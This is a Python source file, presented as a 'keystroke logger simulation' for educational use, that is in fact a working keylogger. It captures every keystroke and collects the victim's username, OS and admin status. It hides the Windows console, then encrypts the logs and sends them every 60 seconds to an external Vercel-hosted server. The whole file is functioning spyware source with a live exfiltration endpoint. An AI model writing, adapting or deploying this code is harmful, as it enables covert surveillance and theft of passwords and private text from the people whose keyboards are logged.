"""
Keystroke logger simulation by SudoHopeX
----------------------------------------------------------------------------

MIT License
Copyright (c) 2025 SudoHopeX

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software for educational and ethical use only, including without limitation the rights
to use, copy, modify, merge, publish (not for sell), and distribute copies of the Software without taking cost, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

This software is strictly for educational and ethical purposes. Any person wishing to use it for malicious purposes is kindly requested not to use it.
The software may not be sold or sublicensed without explicit written permission from the copyright holder.

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""


import os
import logging
import threading
import requests
from datetime import datetime
from pynput import keyboard
import ctypes
import sys
from cryptography.fernet import Fernet
import json
import base64


# Configuration
LOG_FILE = "keylogs.txt"
SERVER_URL = "https://sudohopex-smrti-log.vercel.app"  # server URL
USER_INFO_SEND = True   # send user info or not
send_timer = None       # Timer for periodic sending
log_buffer = []         # Buffer to hold keystrokes before sending

# Setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
    datefmt='%d-%m-%Y %H:%M:%S'
)

# determine the type of os victim is using
def get_os_type():
   if os.name == 'nt':
       return 'Windows'

   elif os.name == 'posix':
      return 'Unix like'

   else:
      return 'Unknown'

# determine the username of victim
def get_uname(sys_os=get_os_type()):
    try:
        return os.getlogin()

    except OSError:
        if sys_os == 'Windows':
            return os.getenv('USERNAME')

        elif sys_os == 'Unix like':
            return os.getenv('USER')

# check if victim's username is admin user
def check_uname_admin(sys_os=get_os_type()):
   if sys_os == 'Windows':
      if ctypes.windll.shell32.IsUserAnAdmin() == 0:
         return True
      else:
         return False

   elif sys_os == 'Unix like':
      if os.geteuid() == 0:
         return True
      return False

   else:
      return False

def get_encryption_key():
    try:
        # Fetch new symmetric key from server
        response = requests.get(f"{SERVER_URL}/get_key")
        if response.status_code == 200:
            return base64.b64decode(response.json()['key']), base64.b64decode(response.json()['key_id'])

    except Exception as e:
        logging.error(f"Failed to fetch encryption key: {str(e)}")
        return None


def send_logs():
    global log_buffer
    global USER_INFO_SEND
    global send_timer

    if log_buffer:
        try:

            # Get new encryption key for this transmission
            encryption_key, encryption_key_id = get_encryption_key()
            if not encryption_key or not encryption_key_id:
                return

            cipher_suite = Fernet(encryption_key)

            # Prepare data to send
            data = "\n".join(log_buffer)
            payload = {"logs": data}

            if USER_INFO_SEND:
                os_type = get_os_type()
                payload.update({
                    "user_os": os_type,
                    "username": get_uname(os_type),
                    "username_admin": check_uname_admin(os_type)
                })

            # Encrypt payload
            payload_bytes = json.dumps(payload).encode('utf-8')
            encrypted_data = cipher_suite.encrypt(payload_bytes)

            # Send encrypted data
            encrypted_data_final = base64.b64encode(encrypted_data).decode('utf-8')

            # print data in console
            payload={"encrypted_data": encrypted_data_final,
                      "key_id": base64.b64encode(encryption_key_id).decode('utf-8')
                      }

            # print("sending Payload:", payload)  # for test purpose
            response = requests.post(
                f"{SERVER_URL}/receive_logs",
                json=payload
            )

            if response.status_code == 200:
                USER_INFO_SEND = False
                log_buffer = []

        except:
            # logging.error(f"Failed to send logs: {str(e)}")
            pass

    # Schedule next send in 60 seconds
    send_timer = threading.Timer(60, send_logs)
    send_timer.start()

def on_press(key):
    
    try:

        # Check for ESC key first
        if key == keyboard.Key.esc or key.char == '<esc>':
            send_logs()  # Send final logs
            # Cancel all timer threads
            for thread in threading.enumerate():
                if isinstance(thread, threading.Timer):
                    thread.cancel()
            return False  # Stop listener

        key_str = key.char
        log_data = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {key_str}"

    except AttributeError:
        key_str = f"<{key.name}>"
        log_data = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {key_str}"

    except KeyboardInterrupt:
        send_logs() # send all stored logs before program exit
        for thread in threading.enumerate():
            if isinstance(thread, threading.Timer):
                thread.cancel()
        sys.exit()   # Exit program

    logging.info(log_data)
    log_buffer.append(log_data)

def on_release(key):
    # stop on ESC key release
    if key == keyboard.Key.esc:
        return False
    return True

def hide_console():
    # Hide console window on Windows
    if os.name == 'nt':
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
            ctypes.windll.kernel32.CloseHandle(whnd)


def main():
    send_logs()      # Start periodic log sending
    hide_console()   # Hide console

    # Start keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
